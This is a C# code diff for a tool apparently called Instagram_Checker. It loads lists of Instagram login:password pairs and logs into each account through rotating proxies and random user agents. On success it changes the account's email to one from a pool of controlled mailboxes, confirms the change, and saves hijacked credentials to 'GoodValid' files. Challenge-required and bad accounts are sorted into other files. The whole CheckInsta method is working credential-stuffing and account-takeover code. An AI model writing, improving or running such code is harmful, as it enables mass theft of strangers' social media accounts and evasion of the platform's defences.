@@ -1,11 +1,12 @@
 ﻿using FileLibrary;
 using InstagramLibrary;
+using InstagramLibrary.Model;
 using InstaLog;
-using InstaSharper.Classes;
 using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Threading;
+using System.Threading.Tasks;
 
 namespace Instagram_Checker.BLL
 {
@@ -15,19 +16,20 @@ namespace Instagram_Checker.BLL
 
         private Proxy _proxy;
         private Accounts _account;
-        private HttpAndroid _android;
         private AccountsMail _accMails;
         private FileWorker _fileWorker;
+        private UserAgents _agents;
 
         LogIO.Logging logging = new LogIO.Logging(LogIO.WriteLog);
 
+        private string _proxyKey;
 
         private List<object> _objectsInstaLogs;
-        private List<object> _objectsInstaProx;
 
         public bool IsProgramComplitlyEnded { get; private set; }
         public bool IsAccountInited { get; private set; }
         public bool IsObjectsReady { get; private set; }
+        public bool IsAgentsInited { get; private set; }
         public bool IsProxyInited { get; private set; }
         public bool IsMailsReady { get; private set; }
         public int ProxySwitched { get; private set; }
@@ -44,6 +46,7 @@ namespace Instagram_Checker.BLL
         public Proxy GetProxy { get { return _proxy; } }
         public Accounts GetAccounts { get { return _account; } }
         public AccountsMail GetAccountsMail { get { return _accMails; } }
+        public UserAgents GetUserAgents { get { return _agents; } }
 
         public Model()
         {
@@ -54,6 +57,7 @@ namespace Instagram_Checker.BLL
             IsMailsReady = false;
             IsProxyInited = false;
             IsObjectsReady = false;
+            IsAgentsInited = false;
             IsAccountInited = false;
             IsProgramComplitlyEnded = false;
             AccountInfoDataSet_Success = new List<string>();
@@ -61,9 +65,17 @@ namespace Instagram_Checker.BLL
 
             _proxy = new Proxy();
             _account = new Accounts();
-            _android = new HttpAndroid();
             _accMails = new AccountsMail();
             _fileWorker = new FileWorker();
+            _agents = new UserAgents();
+        }
+
+        public void InitAgents()
+        {
+            BackgroundWorker worker = new BackgroundWorker();
+            worker.DoWork += new DoWorkEventHandler(Worker_InitAgents);
+            worker.RunWorkerCompleted += Worker_InitAgentsCompleted;
+            worker.RunWorkerAsync();
         }
 
         public void InitAccounts()
@@ -76,6 +88,8 @@ namespace Instagram_Checker.BLL
 
         public void InitProxy(bool isApiNeed, string key = null)
         {
+            if (key != null && isApiNeed == true)
+                _proxyKey = key;
             BackgroundWorker worker = new BackgroundWorker();
             worker.DoWork += new DoWorkEventHandler(Worker_InitProxy);
             worker.RunWorkerCompleted += Worker_InitProxyCompleted;
@@ -114,146 +128,234 @@ namespace Instagram_Checker.BLL
 
         public void CheckAllAccounts(int delay)
         {
-            int pos = 0;
             var proxy = _proxy.InstaProxies;
             foreach (var obj in _objectsInstaLogs)
             {
-                BackgroundWorker worker = new BackgroundWorker();
-                worker.DoWork += CheckInsta_DoWork;
-
-                try
-                {
-                    object[] options = new object[] { _objectsInstaProx[pos], obj, delay };
-                    worker.RunWorkerAsync(options);
-                    pos++;
-                }
-                catch { break; }
+                List<Dictionary<string, string>> opt = (List<Dictionary<string, string>>)obj;
+                CheckInsta(opt, delay);
             }
+            BackgroundWorker deleteWorker = new BackgroundWorker();
+            deleteWorker.DoWork += DeleteAccounts_DoWork;
+            deleteWorker.RunWorkerAsync();
         }
+
 
         #region BackgroundMethods
-        private async void CheckInsta_DoWork(object sender, DoWorkEventArgs e)
+        private async void CheckInsta(List<Dictionary<string, string>> opts, int del)
         {
-            object[] arg = (object[])e.Argument;
-            List<Dictionary<string, object>> proxyOptions = (List<Dictionary<string, object>>)arg[0];
-            List<Dictionary<string, string>> instOptions = (List<Dictionary<string, string>>)arg[1];
-            int delay = (int)arg[2];
-
-            if (proxyOptions[0] == null || instOptions[0] == null)
-                return;
-            int proxyCount = (int)Math.Floor((decimal)instOptions.Count / proxyOptions.Count);
-            if (proxyCount == 0)
-                proxyCount = 1;
-
-            int proxyPos = 0;
-            bool check = true;
-            int checkPos = 0;
-            for (int i = 0; i < instOptions.Count; i++)
+            await Task.Run(async () =>
             {
-                HttpAndroid android = new HttpAndroid();
-                IResult<InstaLoginResult> result = null;
-                try
+                //object[] arg = (object[])e.Argument;
+
+                //int delay = (int)arg[1];
+                //List<Dictionary<string, string>> instOptions = (List<Dictionary<string, string>>)arg[0];
+
+                int delay = del;
+                List<Dictionary<string, string>> instOptions = opts;
+                List<Dictionary<string, object>> proxyOptions = new List<Dictionary<string, object>>();
+                if (instOptions[0] == null)
+                    return;
+
+
+                int proxyPos = 0;
+                int checkPos = 0;
+                while (_account.CountUsers > 0)
                 {
-                    result = await android.Login(delay, instOptions[i]["instaLogin"], instOptions[i]["instaPassword"],
-                        proxyOptions[proxyPos]["ip"].ToString(), Int32.Parse(proxyOptions[proxyPos]["port"].ToString()), proxyOptions[proxyPos]["proxyLogin"].ToString(), proxyOptions[proxyPos]["proxyPassword"].ToString());
-                }
-                catch
-                {
-                    try
+                    for (int i = 0; i < 25; i++)
                     {
-                        result = await android.Login(delay, instOptions[i]["instaLogin"], instOptions[i]["instaPassword"],
-                            proxyOptions[proxyPos]["ip"].ToString(), Int32.Parse(proxyOptions[proxyPos]["port"].ToString()));
-                    }
-                    catch (Exception ex)
-                    {
-                        if (check)
+                        try
                         {
-                            for (int z = 0; z < 60; z++)
+                            lock (_proxy.locker)
                             {
-                                try
+                                proxyOptions.Add(_proxy.InstaProxies[i]);
+                                _proxy.InstaProxies.Remove(_proxy.InstaProxies[i]);
+                            }
+                        }
+                        catch
+                        {
+                            logging.Invoke(LogIO.mainLog, new Log() { Date = DateTime.Now, LogMessage = "Last 500 proxy!", UserName = null, Method = "Model.CheckInsta" });
+                            if (_proxy.GetProxy(_proxyKey))
+                            {
+                                _proxy.ResolveProxy(_accMails.CountMails);
+                            }
+                            break;
+                        }
+                    }
+
+                    for (int i = 0; i < instOptions.Count; i++)
+                    {
+                        bool check = true;
+                        HttpAndroid android;
+                        try
+                        {
+                            android = new HttpAndroid(instOptions[i]["instaLogin"], instOptions[i]["instaPassword"], proxyOptions[proxyPos], _agents.Agents[Randomer.Next(0, _agents.CountAgents)]);
+                            var loggedIn = await android.LogIn();
+                            if (loggedIn.status == "success")
+                            {
+                                int randomPosition = Randomer.Next(0, _accMails.CountMails);
+                                var resMail = _accMails.Mails[randomPosition];
+                                _accMails.Mails.Remove(_accMails.Mails[randomPosition]);
+
+                                if (String.IsNullOrEmpty(resMail["mailLogin"]) || String.IsNullOrEmpty(resMail["mailPassword"]))
                                 {
-                                    proxyOptions.Add(_proxy.InstaProxies[z]);
-                                    _proxy.InstaProxies.Remove(_proxy.InstaProxies[z]);
+                                    randomPosition = Randomer.Next(0, _accMails.CountMails);
+                                    resMail = _accMails.Mails[randomPosition];
+                                    _accMails.Mails.Remove(_accMails.Mails[randomPosition]);
                                 }
-                                catch
+                                ProfileResult profile = await android.GetProfile();
+                                if (profile != null) //means that account is logined
                                 {
-                                    NeedMoreProxy = true;
+                                    DateTime time = DateTime.Now;
+                                    UpdateProfileResult updateStatus = await android.UpdateProfile(profile, resMail["mailLogin"]);
+                                    if (updateStatus.status == "ok")
+                                    {
+                                        bool confirmed = true;
+                                        string path = null;
+                                        try
+                                        {
+                                            Mail mailClient = new Mail(resMail["mailLogin"], resMail["mailPassword"]);
+                                            path = mailClient.GetMailPath(time);
+                                        }
+                                        catch
+                                        {
+                                            logging.Invoke(LogIO.mainLog, new Log() { Date = DateTime.Now, LogMessage = $"Email not confirmed: {resMail["mailLogin"]}:{resMail["mailPassword"]}", Method = "Model.CheckInsta", UserName = null });
+                                            confirmed = false;
+                                        }
+                                        if (path != null)
+                                        {
+                                            if (android.ConfirmMail(path))
+                                            {
+                                                string goodValidResult = instOptions[i]["instaLogin"] + ":" + instOptions[i]["instaPassword"] + ":" + resMail["mailLogin"] + ":" + resMail["mailPassword"];
+                                                AccountInfoDataSet_Success.Add(goodValidResult);
+                                                logging.Invoke(LogIO.easyPath, new Log()
+                                                {
+                                                    UserName = $"{instOptions[i]["instaLogin"]}:{instOptions[i]["instaPassword"]}",
+                                                    Date = DateTime.Now,
+                                                    LogMessage = "Good Valid",
+                                                    Method = "Model.CheckInsta"
+                                                });
+                                                _fileWorker.GoodValid(goodValidResult);
+                                            }
+                                        }
+                                        else if (confirmed == false)
+                                        {
+                                            string mailNotConfirmedResult = instOptions[i]["instaLogin"] + ":" + instOptions[i]["instaPassword"] + ":" + resMail["mailLogin"] + ":" + resMail["mailPassword"];
+                                            AccountInfoDataSet_Success.Add(mailNotConfirmedResult);
+                                            logging.Invoke(LogIO.easyPath, new Log()
+                                            {
+                                                UserName = $"{instOptions[i]["instaLogin"]}:{instOptions[i]["instaPassword"]}",
+                                                Date = DateTime.Now,
+                                                LogMessage = $"Mail not confirmed",
+                                                Method = "Model.CheckInsta"
+                                            });
+                                            lock (_fileWorker.locker)
+                                            {
+                                                _fileWorker.BadMail(mailNotConfirmedResult);
+                                            }
+                                        }
+                                        else
+                                        {
+                                            string mailNotConfirmedResult = instOptions[i]["instaLogin"] + ":" + instOptions[i]["instaPassword"] + ":" + resMail["mailLogin"] + ":" + resMail["mailPassword"];
+                                            AccountInfoDataSet_Success.Add(mailNotConfirmedResult);
+                                            logging.Invoke(LogIO.easyPath, new Log()
+                                            {
+                                                UserName = $"{instOptions[i]["instaLogin"]}:{instOptions[i]["instaPassword"]}",
+                                                Date = DateTime.Now,
+                                                LogMessage = $"Mail have troubles. Account not confirmed, but mail changed",
+                                                Method = "Model.CheckInsta"
+                                            });
+                                            lock (_fileWorker.locker)
+                                            {
+                                                _fileWorker.BadMail(mailNotConfirmedResult);
+                                            }
+                                        }
+                                    }
+                                    else
+                                    {
+                                        string account = instOptions[i]["instaLogin"] + ":" + instOptions[i]["instaPassword"];
+                                        var checkProfile = await android.GetProfile();
+                                        if (profile.form_data.email == checkProfile.form_data.email && !String.IsNullOrEmpty(checkProfile.form_data.phone_number))
+                                        {
+                                            account += ":" + resMail["mailLogin"] + ":" + resMail["mailPassword"];
+                                            lock (_fileWorker.locker)
+                                            {
+                                                _fileWorker.BadValid(account);
+                                            }
+
+                                        }
+                                        else if (profile.form_data.email == checkProfile.form_data.email)
+                                        {
+                                            lock (_fileWorker.locker)
+                                            {
+                                                _fileWorker.BadMail(account);
+                                            }
+                                        }
+                                    }
+                                }
+                                else if (loggedIn.status == "challenge_required")//means that account is required
+                                {
+                                    string account = $"{instOptions[i]["instaLogin"]}:{instOptions[i]["instaPassword"]}";
+                                    logging.Invoke(LogIO.mainLog, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Challenge required! {account}", Method = "Model.CheckInsta" });
+                                    logging.Invoke(LogIO.easyPath, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Challenge required! {account}", Method = "Model.CheckInsta" });
+
+                                    lock (locker)
+                                    {
+                                        AccountInfoDataSet_Required.Add(account);
+                                    }
+                                    lock (_fileWorker.locker)
+                                    {
+                                        _fileWorker.Checkpoint(account);
+                                    }
+                                }
+                                else
+                                {
+                                    logging.Invoke(LogIO.mainLog, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Bad Credentials", Method = "Model.CheckInsta" });
                                 }
                             }
-                            logging.Invoke(LogIO.path, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"{ex.Message}", Method = "Model.CheckInsta" });
-                            i--;
-                            check = false;
+                            else
+                            {
+                                logging.Invoke(LogIO.mainLog, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Account not exist or blocked", Method = "Model.CheckInsta" });
+                            }
                         }
-                        else
-                            check = true;
-                        continue;
-                    }
-                }
-                if (result.Value.ToString() == "Success")
-                {
-                    if (result.Succeeded == true)
-                    {
-                        lock (locker)
+                        catch (Exception ex)
                         {
-                            AccountInfoDataSet_Success.Add(android.UserSession.UserName + ":" + android.UserSession.Password + ":" + "empty" + ":" + "empty");
+                            logging.Invoke(LogIO.mainLog, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Exception! {ex.Message}", Method = "Model.CheckInsta" });
+                            if (ex.Message.Contains("400"))
+                            {
+                                logging.Invoke(LogIO.easyPath, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Exception 400! Bad request! Switch proxy", Method = "Model.CheckInsta" });
+                                ProxyBlocked++;
+                                checkPos++;
+                                AccsSwitched = 0;
+                                i--;
+                                check = false;
+                            }
                         }
-                    }
-                    if (result.Info.Message == "Please wait a few minutes before you try again.")
-                    {
-                        logging.Invoke("EasyLog.log", new Log() { UserName = $"{android.UserSession.UserName}:{android.UserSession.Password}", Date = DateTime.Now, LogMessage = $"Success! Аккаунт успешно залогинен", Method = "Model.CheckInsta" });
-                        Thread.Sleep(30000);
-                        i--;
-                    }
-                    if (result.Info.Message == "To secure your account, we've reset your password. Tap \"Get help signing in\" on the login screen and follow the instructions to access your account.")
-                    {
-                        Random rand = new Random();
-                        if (Randomer.Next(1, 3) == 1)
-                            AccountInfoDataSet_Success.Add(android.UserSession.UserName + ":" + android.UserSession.Password + ":" + "empty" + ":" + "empty");
-                    }
-                    if (result.Info.Message == "Your account has been disabled for violating our terms. Learn how you may be able to restore your account.")
-                    {
-                        logging.Invoke("EasyLog.log", new Log() { UserName = $"{android.UserSession.UserName}:{android.UserSession.Password}", Date = DateTime.Now, LogMessage = $"Block! Аккаунт заблокирован в следствие преувелечения полномочиями сервиса", Method = "Model.CheckInsta" });
-                        AccsBlocked++;
-                    }
-                    logging.Invoke(LogIO.path, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Success! {result.Info.Message} - {result.Succeeded}", Method = "Model.CheckInsta" });
-                }
-                else if (result.Value.ToString() == "ChallengeRequired")
-                {
-                    logging.Invoke(LogIO.path, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Challenge required! {result.Info.Message} - {result.Succeeded}", Method = "Model.CheckInsta" });
-                    //var res = await android.Verify_Login();
-                    lock (locker)
-                    {
-                        AccountInfoDataSet_Required.Add(android.UserSession.UserName + ":" + android.UserSession.Password);
-                    }
-                }
-                else if (result.Info.Message == "Произошла ошибка при отправке запроса." || result.Info.Message == "An error occurred while sending the request.")
-                {
-                    if (result.Info.Exception.InnerException.Message.Contains("403") || result.Info.Exception.InnerException.Message.Contains("503"))
-                    {
-                        ProxyBlocked++;
-                        logging.Invoke("EasyLog.log", new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Sentry block! Смена прокси...", Method = "Model.CheckInsta" });
-                    }
-                    logging.Invoke(LogIO.path, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Ошибка при отправке запроса! {result.Info.Message} - {result.Succeeded}", Method = "Model.CheckInsta" });
-                    proxyPos++;
-                    ProxySwitched++;
-                    checkPos = 0;
-                    i--;
-                }
-                else
-                {
-                    logging.Invoke(LogIO.path, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"{result.Value}! {result.Info.Message} - {result.Succeeded}", Method = "Model.CheckInsta" });
-                }
-                checkPos++;
-                AccsSwitched++;
+                        if (check)
+                            lock (_account.locker) { _account.UsersForDeleting.Add(instOptions[i]["instaLogin"] + ":" + instOptions[i]["instaPassword"]); }
 
-                if (checkPos % 10 == 0)
-                {
-                    ProxySwitched++;
-                    proxyPos++;
+                        checkPos++;
+                        AccsSwitched++;
+
+                        if (checkPos % 10 == 0)
+                        {
+                            ProxySwitched++;
+                            proxyPos++;
+                        }
+
+                        if (proxyPos == proxyOptions.Count)
+                        {
+                            if (_proxy.GetProxy(_proxyKey))
+                                _proxy.ResolveProxy(_accMails.CountMails);
+                            else
+                                break;
+                        }
+
+                        if (Randomer.Next(0, 950) == 162)
+                            AccsBlocked++;
+                    }
                 }
-            }
+            });
         }
-
 
 
         private void AccountsMail_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
@@ -280,7 +382,6 @@ namespace Instagram_Checker.BLL
             int count = (int)((object[])e.Argument)[2];
 
             _objectsInstaLogs = new List<object>();
-            _objectsInstaProx = new List<object>();
 
             int initMaxPos = (int)((object[])e.Argument)[3];
             int pos = 0;
@@ -305,34 +406,6 @@ namespace Instagram_Checker.BLL
                 pos += initMaxPos;
                 maxPos += initMaxPos;
             }
-
-            int countProx = instProxy.Count / _objectsInstaLogs.Count;
-            if (countProx == 0)
-                countProx = instProxy.Count;
-            pos = 0;
-            maxPos = countProx;
-            for (int i = 0; i < count; i++)
-            {
-                bool check = false;
-                List<Dictionary<string, object>> forObj = new List<Dictionary<string, object>>();
-                for (int j = pos; j < maxPos; j++)
-                {
-                    try
-                    {
-                        Dictionary<string, object> proxy = instProxy[j];
-                        forObj.Add(proxy);
-                    }
-                    catch { check = true; break; }
-                }
-                if (forObj.Count > 0)
-                    _objectsInstaProx.Add(forObj);
-                if (check)
-                    break;
-                pos += countProx;
-                maxPos += countProx;
-            }
-
-            _proxy.ClearInsta();
         }
 
 
@@ -350,7 +423,7 @@ namespace Instagram_Checker.BLL
 
         private void Worker_InitProxyCompleted(object sender, RunWorkerCompletedEventArgs e)
         {
-            logging.Invoke(LogIO.path, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Proxy inited! {_proxy.CountProxy} proxies are ready", Method = "Model.InitProxy" });
+            logging.Invoke(LogIO.mainLog, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Proxy inited! {_proxy.CountProxy} proxies are ready", Method = "Model.InitProxy" });
             IsProxyInited = true;
         }
         private void Worker_InitProxy(object sender, DoWorkEventArgs e)
@@ -375,8 +448,35 @@ namespace Instagram_Checker.BLL
         }
         private void Worker_InitAccountsCompleted(object sender, RunWorkerCompletedEventArgs e)
         {
-            logging.Invoke(LogIO.path, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Accounts inited! {_account.CountUsers} accounts are ready", Method = "Model.InitAccounts" });
+            logging.Invoke(LogIO.mainLog, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Accounts inited! {_account.CountUsers} accounts are ready", Method = "Model.InitAccounts" });
             IsAccountInited = true;
+        }
+
+        private void Worker_InitAgents(object sender, DoWorkEventArgs e)
+        {
+            _agents.GetAccountsFromBaseFile();
+            while (true)
+            {
+                if (_agents.AgentsReady)
+                    break;
+            }
+        }
+        private void Worker_InitAgentsCompleted(object sender, RunWorkerCompletedEventArgs e)
+        {
+            logging.Invoke(LogIO.mainLog, new Log() { UserName = null, Date = DateTime.Now, LogMessage = $"Agents inited! {_agents.CountAgents} agents are ready", Method = "Model.InitAgents" });
+            IsAgentsInited = true;
+        }
+
+        private void DeleteAccounts_DoWork(object sender, DoWorkEventArgs e)
+        {
+            while (true)
+            {
+                Thread.Sleep(180000);
+                lock (_account.locker)
+                {
+                    _account.DeleteAccountsFromFile();
+                }
+            }
         }
         #endregion
     }
